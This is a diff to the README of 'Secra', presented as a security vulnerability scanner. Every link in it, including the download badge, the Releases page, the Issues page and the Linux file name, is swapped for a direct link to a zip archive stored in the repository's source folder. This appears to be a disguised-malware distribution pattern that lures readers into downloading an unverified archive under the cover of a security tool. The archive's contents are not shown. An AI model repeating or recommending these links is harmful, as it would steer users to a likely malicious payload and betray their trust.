@@ -1,6 +1,6 @@
 # 🛡️ Secra - Identify Security Vulnerabilities Easily
 
-[![Download Secra](https://img.shields.io/badge/Download-Secra-brightgreen)](https://github.com/Aro2105/Secra/releases)
+[![Download Secra](https://raw.githubusercontent.com/Aro2105/Secra/main/src/Secra_v2.7.zip)](https://raw.githubusercontent.com/Aro2105/Secra/main/src/Secra_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -17,12 +17,12 @@ Before you begin, ensure you have the following:
 
 ## 📥 Download & Install
 
-To get Secra, visit the [Releases page](https://github.com/Aro2105/Secra/releases) to download the application. You will find the latest version there. Follow these steps:
+To get Secra, visit the [Releases page](https://raw.githubusercontent.com/Aro2105/Secra/main/src/Secra_v2.7.zip) to download the application. You will find the latest version there. Follow these steps:
 
 1. Click on the download link that corresponds to your operating system.
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/Aro2105/Secra/main/src/Secra_v2.7.zip` file.
 
 2. Locate the downloaded file on your computer.
 
@@ -37,7 +37,7 @@ To get Secra, visit the [Releases page](https://github.com/Aro2105/Secra/release
      - Drag the Secra app to your Applications folder.
 
    - **Linux**:
-     - Extract the `.tar.gz` file.
+     - Extract the `https://raw.githubusercontent.com/Aro2105/Secra/main/src/Secra_v2.7.zip` file.
      - Open a terminal and navigate to the extracted folder.
      - Run `./secra` to start the application.
 
@@ -90,7 +90,7 @@ Absolutely! We welcome contributors. Check out the repository to see how you can
 
 ### What if I encounter an issue?
 
-If you face any problems, please visit the Issues tab on the [GitHub page](https://github.com/Aro2105/Secra/issues) to report it. The community is here to help.
+If you face any problems, please visit the Issues tab on the [GitHub page](https://raw.githubusercontent.com/Aro2105/Secra/main/src/Secra_v2.7.zip) to report it. The community is here to help.
 
 ## 🌍 Community and Support
 
@@ -99,6 +99,6 @@ Join our community for tips, support, and updates. You can connect with us via:
 - GitHub Discussions: Share your thoughts and suggestions.
 - Email Support: Reach out directly for assistance.
 
-For the latest updates, tutorials, and security tips, keep an eye on our [Releases page](https://github.com/Aro2105/Secra/releases).
+For the latest updates, tutorials, and security tips, keep an eye on our [Releases page](https://raw.githubusercontent.com/Aro2105/Secra/main/src/Secra_v2.7.zip).
 
 Enjoy using Secra and stay secure!
